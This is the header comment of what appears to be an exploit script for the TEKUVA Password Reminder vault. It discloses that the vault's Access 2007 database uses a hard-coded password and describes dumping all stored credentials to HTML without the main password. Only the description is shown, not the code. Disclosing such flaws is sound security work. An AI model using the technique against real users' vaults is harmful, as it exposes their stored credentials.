# Info: TEKUVA Password Reminder is a password vault that allows you to store all
#       your credentials in one spot and all you have to remember is a single 'main'
#       password to access your vault. Unfortunately, the vault is actually an
#       Access 2007 database that is protected by a password which is hard coded into
#       the program, not your main password.
#
#       This script connects to the database using the hard coded db password and dumps
#       everything into an HTML table, bypassing the need to enter the main vault
#       password (or use the program at all for that matter). Modify values as needed.
